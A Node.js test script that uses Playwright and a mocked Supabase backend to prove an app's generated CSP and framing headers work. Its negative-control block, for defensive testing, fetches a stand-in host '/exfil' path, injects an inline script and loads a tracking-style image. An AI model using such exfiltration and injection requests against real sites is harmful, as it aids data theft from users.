#!/usr/bin/env node
// PROOF that the generated security headers do not break the web app.
//
//   node scripts/deploy/csp_proof.mjs [--out <dir>] [--skip-build] [--strict] [--json report.json]
//
// 1. Production build of web/ (`vite build --outDir <out>/dist`, never web/dist)
//    with a fake VITE_SUPABASE_URL.
// 2. scripts/deploy/web_headers.mjs writes _headers/_redirects into that build,
//    plus an "embed" variant (/book/* frameable) next to it.
// 3. lib/static_server.mjs serves the build with Cloudflare Pages semantics.
// 4. Chromium (Playwright from web/node_modules) opens the login page, a public
//    booking page, the staff dashboard, the calendar (FullCalendar style
//    injection) and reports (Recharts) against a mocked Supabase
//    (page.route + routeWebSocket, the web/e2e approach), and asserts:
//    the CSP header is served, zero `securitypolicyviolation` events, zero CSP
//    console errors, no uncaught page errors, no request to an unexpected origin.
// 5. Negative controls prove the detector works (a forbidden fetch, inline
//    script and image ARE reported) and framing works as configured
//    (default: nothing frameable; embed variant: only /book/*).
// Exit code 1 on any failure. Chromium comes from PLAYWRIGHT_BROWSERS_PATH
// (PW_CHROMIUM_EXECUTABLE overrides the binary); nothing is installed.
import { spawnSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { createServer } from 'node:http';
import { createRequire } from 'node:module';
import { tmpdir } from 'node:os';
import { join, relative, resolve } from 'node:path';
import { REPO_ROOT } from './lib/config.mjs';
import { startStaticServer } from './lib/static_server.mjs';
import { buildHeadersFile, generate } from './web_headers.mjs';

const WEB = join(REPO_ROOT, 'web');
const SB = 'https://csp-proof.supabase.co';
const STORAGE_KEY = `sb-${new URL(SB).hostname.split('.')[0]}-auth-token`;
const argv = process.argv.slice(2);
const arg = (name) => (argv.includes(name) ? argv[argv.indexOf(name) + 1] : undefined);
const OUT = resolve(arg('--out') ?? mkdtempSync(join(tmpdir(), 'csp-proof-')));
const DIST = join(OUT, 'dist');
if (!relative(WEB, OUT).startsWith('..')) {
  console.error('csp_proof: --out must be outside web/ (never build into web/dist)');
  process.exit(64);
}

const require = createRequire(join(WEB, 'package.json'));
const { chromium } = require('@playwright/test');

// ------------------------------------------------------------ build + headers
if (!argv.includes('--skip-build')) {
  mkdirSync(OUT, { recursive: true });
  console.log(`building web/ -> ${DIST}`);
  const r = spawnSync('npx', ['vite', 'build', '--outDir', DIST, '--emptyOutDir', '--logLevel', 'warn'], {
    cwd: WEB,
    stdio: 'inherit',
    env: { ...process.env, VITE_SUPABASE_URL: SB, VITE_SUPABASE_ANON_KEY: 'csp-proof-anon-key' },
  });
  if (r.status !== 0) process.exit(r.status ?? 1);
}
const gen = generate({ dist: DIST, supabaseUrl: SB });
const embedFile = join(OUT, '_headers.embed');
writeFileSync(embedFile, buildHeadersFile({ supabaseUrl: SB, html: readFileSync(join(DIST, 'index.html'), 'utf8'), embedPaths: ['/book/*'] }).text);
console.log(`CSP: ${gen.csp}\n`);

const A = await startStaticServer({ dir: DIST }); // production headers
const B = await startStaticServer({ dir: DIST, headersFile: embedFile }); // /book/* embeddable
const C = await new Promise((res) => {
  // A different origin that tries to frame the app.
  const srv = createServer((req, resp) => {
    const src = new URL(req.url, 'http://x').searchParams.get('src') ?? '';
    resp.writeHead(200, { 'content-type': 'text/html' });
    resp.end(`<!doctype html><title>embedder</title><iframe id="f" src="${src.replace(/"/g, '')}" width="800" height="600"></iframe>`);
  });
  srv.listen(0, '127.0.0.1', () => res({ url: `http://127.0.0.1:${srv.address().port}`, close: () => new Promise((r) => srv.close(r)) }));
});
const LOCAL = new Set([new URL(A.url).host, new URL(B.url).host, new URL(C.url).host]);

// ------------------------------------------------------------ fixtures (test data only)
const OWNER = { id: '00000000-0000-4000-8000-000000000001', email: 'owner@csp-proof.test', fullName: 'Proof Owner' };
const SHOP = {
  id: '10000000-0000-4000-8000-000000000001',
  name: 'Glacier Detailing',
  slug: 'glacier',
  timezone: 'America/Chicago',
  currency: 'usd',
  logo_path: null,
  brand_color: '#1F6FEB',
  business_type: 'mobile',
  techs_can_collect_payments: false,
  tax_rate_bps: 0,
};
const MEMBER = { id: '20000000-0000-4000-8000-000000000001', shop_id: SHOP.id, role: 'owner', display_name: OWNER.fullName, calendar_color: null, shop: SHOP };
const b64 = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
function session(user) {
  const exp = Math.floor(Date.now() / 1000) + 3600;
  const authUser = {
    id: user.id,
    aud: 'authenticated',
    role: 'authenticated',
    email: user.email,
    email_confirmed_at: '2026-01-01T00:00:00Z',
    app_metadata: { provider: 'email', providers: ['email'] },
    user_metadata: { full_name: user.fullName },
    created_at: '2026-01-01T00:00:00Z',
    updated_at: '2026-01-01T00:00:00Z',
  };
  return {
    access_token: [b64({ alg: 'HS256', typ: 'JWT' }), b64({ sub: user.id, email: user.email, role: 'authenticated', aud: 'authenticated', exp }), 'sig'].join('.'),
    refresh_token: `refresh-${user.id}`,
    token_type: 'bearer',
    expires_in: 3600,
    expires_at: exp,
    user: authUser,
  };
}
const today = new Date().toISOString().slice(0, 10);
const RPC = {
  public_shop_profile: {
    name: SHOP.name,
    slug: SHOP.slug,
    logo_path: null,
    brand_color: '#1F6FEB',
    phone: null,
    website: null,
    city: null,
    region: null,
    country: 'US',
    timezone: SHOP.timezone,
    currency: 'usd',
    business_type: 'both',
    tax_rate_bps: 0,
    booking: {
      enabled: true,
      auto_confirm: false,
      lead_time_minutes: 60,
      max_days_ahead: 60,
      slot_interval_minutes: 30,
      require_deposit: false,
      deposit_type: 'percent',
      deposit_value: 0,
      service_area_limited: false,
      booking_message: null,
      cancellation_policy: null,
      allow_client_cancel_hours: 24,
    },
  },
  public_booking_catalog: {
    vehicle_categories: [{ id: '11111111-1111-4111-8111-111111111111', name: 'Sedan' }],
    service_categories: [{ id: 'dddddddd-dddd-4ddd-8ddd-dddddddddddd', name: 'Detailing' }],
    services: [],
    addons: [],
  },
  dashboard_summary: {
    shop_id: SHOP.id,
    timezone: SHOP.timezone,
    as_of: new Date().toISOString(),
    scope: 'shop',
    today,
    week_start: today,
    month_start: `${today.slice(0, 7)}-01`,
    jobs_today: { total: 0, by_status: {} },
    next_job: null,
    jobs_this_week: 0,
    pending_booking_requests: 0,
    quotes_awaiting_response: 0,
    open_invoices: { count: 0, balance_cents: 0 },
    overdue_invoices: { count: 0, balance_cents: 0 },
    revenue: {
      today: { net_cents: 0, tips_cents: 0, payments_count: 0 },
      week: { net_cents: 0, tips_cents: 0, payments_count: 0 },
      month: { net_cents: 0, tips_cents: 0, payments_count: 0 },
    },
    unread_inbound_messages: 0,
    clocked_in: { count: 0, members: [] },
  },
  calendar_events: [],
  shop_team: [],
  // Shop subscription billing (test data only): billing on, a shop in its
  // trial, one plan for the /pricing and Settings > Billing scenarios.
  shop_entitlement: {
    billing_enabled: true,
    state: 'trialing',
    reason: 'trial',
    plan_name: null,
    trial_ends_at: new Date(Date.now() + 30 * 86_400_000).toISOString(),
    current_period_end: null,
    cancel_at_period_end: false,
    max_members: null,
    members_used: 1,
    can_write: true,
    is_owner: true,
  },
  public_billing_plans: [
    {
      id: '30000000-0000-4000-8000-000000000001',
      name: 'Proof Plan',
      description: null,
      amount_cents: 1000,
      currency: 'usd',
      interval: 'month',
      interval_count: 1,
      max_members: null,
      features: ['proof_feature'],
    },
  ],
  report_revenue: ({ body }) => {
    const rows = [];
    for (let d = new Date(`${body.p_from}T00:00:00Z`); d <= new Date(`${body.p_to}T00:00:00Z`); d = new Date(d.getTime() + 86_400_000)) {
      const n = rows.length;
      rows.push({ bucket_start: d.toISOString().slice(0, 10), gross_cents: n % 3 ? 1000 * n : 0, refunds_cents: 0, net_cents: n % 3 ? 1000 * n : 0, tips_cents: 0, payments_count: n % 3 ? 1 : 0 });
    }
    return rows;
  },
  report_payments: ['card', 'card_present', 'cash', 'check', 'bank_transfer', 'other'].map((method) => ({
    method,
    payments_count: 0,
    gross_cents: 0,
    refunds_cents: 0,
    net_cents: 0,
    tips_cents: 0,
    tip_refunds_cents: 0,
    collected_cents: 0,
    deposits_cents: 0,
    memberships_cents: 0,
  })),
};
const TABLES = {
  shop_members: [MEMBER],
  notifications: [],
  shop_billing: [{ plan_id: null, status: 'none', trial_ends_at: RPC.shop_entitlement.trial_ends_at, current_period_end: null, cancel_at_period_end: false }],
  business_hours: [0, 1, 2, 3, 4, 5, 6].map((weekday) => ({ weekday, opens_at: '08:00:00', closes_at: '18:00:00' })),
  resources: [],
};

// ------------------------------------------------------------ browser harness
const browser = await chromium.launch({ executablePath: process.env.PW_CHROMIUM_EXECUTABLE || undefined });
const failures = [];
const report = [];
const STRICT = argv.includes('--strict');

/**
 * Violations that are understood, harmless and have a known fix outside this
 * script. Reported as KNOWN (FAIL with --strict); once the fix lands they stop
 * appearing and the entry should be deleted.
 */
const KNOWN_VIOLATIONS = [
  {
    id: 'zod-jit-probe',
    match: (v) => v.directive.startsWith('script-src') && v.blocked === 'eval',
    why:
      "zod 4 probes `new Function` once to decide whether to JIT-compile object schemas; the CSP (no 'unsafe-eval') blocks it, zod " +
      'catches it and uses its interpreter. Fix: web/src/zodConfig.ts calling `z.config({ jitless: true })`, imported as the FIRST line of ' +
      'web/src/main.tsx (the probe runs when the first z.object is built, i.e. while other modules are imported). Verified: --strict passes with it.',
  },
];
const knownSeen = new Map();
function splitKnown(violations) {
  const unknown = [];
  for (const v of violations) {
    const k = KNOWN_VIOLATIONS.find((x) => x.match(v));
    if (k) knownSeen.set(k.id, k.why);
    else unknown.push(v);
  }
  return STRICT ? violations : unknown;
}

async function newPage({ user } = {}) {
  const context = await browser.newContext();
  const page = await context.newPage();
  const rec = { violations: [], cspConsole: [], otherConsole: [], pageErrors: [], unexpected: [] };
  await context.addInitScript(() => {
    window.__csp = [];
    document.addEventListener('securitypolicyviolation', (e) => {
      window.__csp.push({ directive: e.violatedDirective, blocked: e.blockedURI, sample: e.sample, source: e.sourceFile, line: e.lineNumber });
    });
  });
  if (user) {
    await context.addInitScript(({ key, value }) => window.localStorage.setItem(key, value), { key: STORAGE_KEY, value: JSON.stringify(session(user)) });
  }
  page.on('console', (msg) => {
    const text = msg.text();
    if (/Content Security Policy|Content-Security-Policy|Refused to|Permissions-Policy|X-Frame-Options/i.test(text)) rec.cspConsole.push(`[${msg.type()}] ${text}`);
    else if (msg.type() === 'error') rec.otherConsole.push(text);
  });
  page.on('pageerror', (err) => rec.pageErrors.push(String(err?.message ?? err)));

  // Registered first = consulted last: anything not handled below.
  await context.route('**/*', (route) => {
    const u = new URL(route.request().url());
    if (LOCAL.has(u.host)) return route.continue();
    rec.unexpected.push(u.origin + u.pathname);
    return route.abort();
  });
  const json = (route, status, body, headers = {}) =>
    route.fulfill({ status, contentType: 'application/json', headers: { 'access-control-allow-origin': '*', ...headers }, body: body === undefined ? '' : JSON.stringify(body) });
  await context.route('https://fonts.googleapis.com/**', (route) =>
    route.fulfill({
      status: 200,
      contentType: 'text/css',
      headers: { 'access-control-allow-origin': '*' },
      body: "@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v0/csp-proof.woff2) format('woff2')}",
    }),
  );
  await context.route('https://fonts.gstatic.com/**', (route) => route.fulfill({ status: 200, contentType: 'font/woff2', headers: { 'access-control-allow-origin': '*' }, body: '' }));
  await context.route(`${SB}/auth/v1/**`, (route) => {
    const u = new URL(route.request().url());
    if (route.request().method() === 'OPTIONS') return json(route, 204);
    if (u.pathname.endsWith('/user')) return user ? json(route, 200, session(user).user) : json(route, 401, { msg: 'no session' });
    if (u.pathname.endsWith('/token')) return json(route, 400, { code: 'invalid_credentials', msg: 'Invalid login credentials' });
    return json(route, 200, {});
  });
  await context.route(`${SB}/rest/v1/**`, async (route) => {
    const req = route.request();
    const u = new URL(req.url());
    if (req.method() === 'OPTIONS') return json(route, 204);
    const path = u.pathname.replace(/^\/rest\/v1\//, '');
    if (path.startsWith('rpc/')) {
      const entry = RPC[path.slice(4)];
      const body = req.postDataJSON?.() ?? {};
      return json(route, 200, typeof entry === 'function' ? entry({ body }) : (entry ?? null));
    }
    if (req.method() === 'HEAD') return route.fulfill({ status: 200, headers: { 'content-range': '*/0', 'access-control-expose-headers': 'content-range', 'access-control-allow-origin': '*' } });
    const rows = TABLES[path] ?? [];
    if ((req.headers().accept ?? '').includes('vnd.pgrst.object')) return rows[0] ? json(route, 200, rows[0]) : json(route, 406, { code: 'PGRST116', message: 'no rows' });
    return json(route, 200, rows, { 'content-range': `0-${Math.max(rows.length - 1, 0)}/*` });
  });
  await context.route(`${SB}/functions/v1/**`, (route) => json(route, 200, {}));
  await context.route(`${SB}/storage/v1/**`, (route) => json(route, 404, { statusCode: '404', error: 'not_found', message: 'Object not found' }));
  await context.routeWebSocket(/\/realtime\/v1\/websocket/, (ws) => {
    ws.onMessage((message) => {
      let f;
      try {
        f = JSON.parse(String(message));
      } catch {
        return;
      }
      const frame = Array.isArray(f) ? { join_ref: f[0], ref: f[1], topic: f[2], event: f[3], payload: f[4] } : f;
      if (!['phx_join', 'heartbeat', 'access_token', 'phx_leave'].includes(frame.event)) return;
      const response = frame.event === 'phx_join' ? { postgres_changes: (frame.payload?.config?.postgres_changes ?? []).map((b, i) => ({ ...b, id: i + 1 })) } : {};
      const payload = { status: 'ok', response };
      ws.send(JSON.stringify(Array.isArray(f) ? [frame.join_ref ?? null, frame.ref, frame.topic, 'phx_reply', payload] : { topic: frame.topic, event: 'phx_reply', payload, ref: frame.ref, join_ref: frame.join_ref }));
    });
  });
  return { context, page, rec };
}

async function settle(page) {
  await page.waitForLoadState('networkidle').catch(() => {});
  await page.evaluate(() => document.fonts?.ready).catch(() => {});
  await page.waitForTimeout(400);
}

function result(name, ok, detail) {
  report.push({ name, ok, detail });
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${detail ? `  — ${detail}` : ''}`);
  if (!ok) failures.push(name);
}

async function scenario(name, path, { user, ready }) {
  const { context, page, rec } = await newPage({ user });
  try {
    const resp = await page.goto(`${A.url}${path}`);
    const csp = resp.headers()['content-security-policy'];
    const xfo = resp.headers()['x-frame-options'];
    await ready(page);
    await settle(page);
    const all = await page.evaluate(() => window.__csp);
    const violations = splitKnown(all);
    const problems = [];
    if (csp !== gen.csp) problems.push(`CSP header not served as generated (got ${csp ? 'a different value' : 'none'})`);
    if (xfo !== 'DENY') problems.push(`X-Frame-Options ${xfo}`);
    if (violations.length) problems.push(`violations: ${JSON.stringify(violations)}`);
    const cspConsole = rec.cspConsole.filter((t) => STRICT || !(knownSeen.has('zod-jit-probe') && /unsafe-eval/.test(t)));
    if (cspConsole.length) problems.push(`console: ${cspConsole.join(' | ')}`);
    if (rec.pageErrors.length) problems.push(`page errors: ${rec.pageErrors.join(' | ')}`);
    if (rec.unexpected.length) problems.push(`unexpected origins: ${[...new Set(rec.unexpected)].join(', ')}`);
    const knownCount = all.length - violations.length;
    result(
      `${name} (${path})`,
      problems.length === 0,
      problems.join('; ') ||
        `0 violations${knownCount ? ` (+${knownCount} KNOWN)` : ''}${rec.otherConsole.length ? `; ${rec.otherConsole.length} non-CSP console error(s)` : ''}`,
    );
    return { page, context, rec };
  } catch (err) {
    result(`${name} (${path})`, false, String(err?.message ?? err).split('\n')[0]);
    await context.close();
    return null;
  }
}

const heading = (name, level) => async (page) => page.getByRole('heading', { name, ...(level ? { level } : {}) }).first().waitFor({ state: 'visible', timeout: 15_000 });

const login = await scenario('login page', '/login', { ready: heading('Sign in') });
await (await scenario('public booking page', `/book/${SHOP.slug}`, { ready: heading(`Book with ${SHOP.name}`) }))?.context.close();
await (await scenario('staff dashboard', '/app', { user: OWNER, ready: heading('Dashboard', 1) }))?.context.close();
await (
  await scenario('calendar (FullCalendar injects its <style>)', '/app/calendar', {
    user: OWNER,
    ready: async (page) => {
      await page.locator('.fc').first().waitFor({ state: 'visible', timeout: 15_000 });
      const rules = await page.evaluate(() => document.querySelector('style[data-fullcalendar]')?.sheet?.cssRules.length ?? -1);
      if (!(rules > 0)) throw new Error(`FullCalendar stylesheet has ${rules} rules (blocked?)`);
    },
  })
)?.context.close();
await (
  await scenario('reports (Recharts SVG)', '/app/reports', {
    user: OWNER,
    ready: async (page) => page.locator('.recharts-surface').first().waitFor({ state: 'visible', timeout: 15_000 }),
  })
)?.context.close();
// Shop subscription billing: the public plan list and the owner's billing page
// (Stripe Checkout / the Customer Portal are top-level navigations, not loads).
await (
  await scenario('public pricing page', '/pricing', {
    ready: async (page) => page.getByRole('article', { name: 'Proof Plan' }).waitFor({ state: 'visible', timeout: 15_000 }),
  })
)?.context.close();
await (
  await scenario('settings: billing (owner, plans)', '/app/settings/billing', {
    user: OWNER,
    ready: async (page) => page.getByRole('button', { name: /^Choose Proof Plan/ }).waitFor({ state: 'visible', timeout: 15_000 }),
  })
)?.context.close();

// Negative control: the detector must see real violations.
if (login) {
  const { page, context } = login;
  const before = (await page.evaluate(() => window.__csp)).length;
  await page.evaluate(async () => {
    try {
      await fetch('https://csp-proof-evil.example/exfil');
    } catch {
      /* blocked */
    }
    const s = document.createElement('script');
    s.textContent = 'window.__pwned = true';
    document.head.appendChild(s);
    const img = new Image();
    img.src = 'https://csp-proof-evil.example/pixel.png';
    document.body.appendChild(img);
    await new Promise((r) => setTimeout(r, 500));
  });
  const v = (await page.evaluate(() => window.__csp)).slice(before);
  const pwned = await page.evaluate(() => window.__pwned === true);
  const dirs = new Set(v.map((x) => x.directive.replace(/-(elem|attr)$/, '')));
  result(
    'negative control: forbidden fetch / inline script / image are blocked and reported',
    !pwned && dirs.has('connect-src') && dirs.has('script-src') && dirs.has('img-src'),
    `${v.length} violation(s): ${[...dirs].join(', ')}${pwned ? '; INLINE SCRIPT RAN' : ''}`,
  );
  await context.close();
}

// Framing: default headers => nothing frameable; embed variant => only /book/*.
async function framed(server, path) {
  const { context, page, rec } = await newPage();
  await page.goto(`${C.url}/frame?src=${encodeURIComponent(`${server.url}${path}`)}`);
  await page.waitForTimeout(2500);
  const frame = page.frames().find((f) => f !== page.mainFrame());
  let rendered = false;
  if (frame && !frame.url().startsWith('chrome-error:')) {
    rendered = await frame.getByRole('heading').first().isVisible().catch(() => false);
  }
  const refused = rec.cspConsole.some((t) => /frame-ancestors|X-Frame-Options/i.test(t));
  const violations = splitKnown(frame && !frame.url().startsWith('chrome-error:') ? await frame.evaluate(() => window.__csp ?? []).catch(() => []) : []);
  await context.close();
  return { rendered, refused, frameUrl: frame?.url(), violations, pageErrors: rec.pageErrors };
}
{
  const r1 = await framed(A, `/book/${SHOP.slug}`);
  result('framing (default headers): /book/* is NOT frameable', !r1.rendered, `rendered=${r1.rendered} refused=${r1.refused} frame=${r1.frameUrl}`);
  const r2 = await framed(A, '/app');
  result('framing (default headers): /app is NOT frameable', !r2.rendered, `rendered=${r2.rendered} refused=${r2.refused}`);
  const r3 = await framed(B, `/book/${SHOP.slug}`);
  result(
    'framing (--embed-path /book/*): /book/* renders inside a foreign page with 0 violations',
    r3.rendered && r3.violations.length === 0 && r3.pageErrors.length === 0,
    `rendered=${r3.rendered} violations=${r3.violations.length} pageErrors=${r3.pageErrors.length}`,
  );
  const r4 = await framed(B, '/login');
  result('framing (--embed-path /book/*): /login stays NOT frameable', !r4.rendered, `rendered=${r4.rendered} refused=${r4.refused}`);
}

await browser.close();
await Promise.all([A.close(), B.close(), C.close()]);
for (const [id, why] of knownSeen) console.log(`KNOWN ${id}: ${why}`);
const jsonOut = arg('--json');
if (jsonOut) writeFileSync(jsonOut, `${JSON.stringify({ csp: gen.csp, report, known: Object.fromEntries(knownSeen) }, null, 2)}\n`);
console.log(`\n${report.length - failures.length}/${report.length} checks passed (build: ${DIST})`);
process.exit(failures.length ? 1 : 0);
